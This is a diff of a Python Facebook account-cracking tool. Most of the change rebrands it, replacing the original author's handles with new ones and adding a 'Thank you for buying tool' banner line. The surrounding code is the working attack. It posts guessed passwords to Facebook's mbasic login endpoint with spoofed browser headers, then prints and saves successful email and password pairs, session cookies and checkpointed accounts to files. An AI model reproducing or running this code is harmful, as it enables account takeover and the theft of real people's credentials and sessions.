@@ -213,25 +213,25 @@ def back():
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
     clear()
-    print(f"""\033[1;96m      ######## \033[1;96m##     ## \033[1;92m########
-         ##    \033[1;96m##     ## \033[1;92m##
-         ##    \033[1;96m##     ## \033[1;92m##
-         ##    \033[1;96m######### \033[1;92m######
-         ##    \033[1;96m##     ## \033[1;92m##
-         ##    \033[1;96m##     ## \033[1;92m##
-         ##    \033[1;96m##     ## \033[1;92m######## \x1b[1;41m\x1b[1;97mTEAM [SH] \x1b[1;0m
- \033[1;96m  ______________    ___________________________
- \033[1;96m  |  |  |     | \  | |______  |  |_____ |_____/
- \033[1;96m  |  |  |_____|  \_| _______| |  |_____ |    \_
+    print(f"""\033[1;96m       \033[1;96m     \033[1;92m
+             \033[1;96m      \033[1;92m
+            \033[1;96m      \033[1;92m
+             \033[1;96m \033[1;92m
+            \033[1;96m      \033[1;92m
+            \033[1;96m     \033[1;92m
+           \033[1;96m      \033[1;92m \x1b[1;41m\x1b[1;97mTEAM [SH] \x1b[1;0m
+ \033[1;96m  ______________    
+ \033[1;96m  I live in Kurdistan
+ \033[1;96m  ______________
  
 \033[1;32m==================================================
-          Author     : SHOAIB AHAMED
-          Telegram   : The_Monster_401          
-          Facebook   : SHOAIB.401
-          Github     : SHOAIB-404   
-          Version    : \033[1;96mFREE//0.4\x1b[0m\033[1;31m [Updated] \x1b[0m
+          Author     : shaba
+          Telegram   : JG_shaba        
+          Facebook   : nyma
+          Github     : shaba   
+          Version    : \033[2;96mFREE//0.5\x1b[0m\033[2;31m [JG] \x2b[0m
 \033[1;31m==================================================           
-\x1b[0;97m\x1b[1;43m         🍁  SHOAIB AHAMED IS A BRAND 🥰          \x1b[0m
+\x1b[0;97m\x1b[1;43m         🍁 Thank you for buying tool JG_shaba 🥰          \x1b[0m
 """)
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
@@ -556,7 +556,7 @@ def crackmobile_SHOAIB(idf,pwv,nmf):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{N}╭───[SHOAIB-OK]\n└──╭➣ EMAIL:  {H}{idf}{N}\n  └──╭➣ PASSWORD:  {H}{pw}{N}\n  └──╭➣ Cokkie: {H}{kuki} ')
+				print(f'\r{N}╭───[shaba-OK]\n└──╭➣ EMAIL:  {H}{idf}{N}\n  └──╭➣ PASSWORD:  {H}{pw}{N}\n  └──╭➣ Cokkie: {H}{kuki} ')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_SHOAIB(kuki)
 				break
@@ -641,7 +641,7 @@ def crackmbasic_SHOAIB(idf,pwv,nmf):
 			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{N}╭───[SHOAIB-CP]\n└──╭➣ EMAIL: {k}{idf}{N}\n └──╭➣ PASSWORD: {k}{pw}{N}\n   └───➣{m} {ua}{N}\n')
+				print(f'\r{N}╭───[shaba-CP]\n└──╭➣ EMAIL: {k}{idf}{N}\n └──╭➣ PASSWORD: {k}{pw}{N}\n   └───➣{m} {ua}{N}\n')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -650,7 +650,7 @@ def crackmbasic_SHOAIB(idf,pwv,nmf):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{N}╭───[SHOAIB-OK]\n└──╭➣ EMAIL:  {H}{idf}{N}\n  └──╭➣ PASSWORD:  {H}{pw}{N}\n  └──╭➣ Cokkie: {H}{kuki} ')
+				print(f'\r{N}╭───[shaba-OK]\n└──╭➣ EMAIL:  {H}{idf}{N}\n  └──╭➣ PASSWORD:  {H}{pw}{N}\n  └──╭➣ Cokkie: {H}{kuki} ')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_SHOAIB(kuki)
 				break
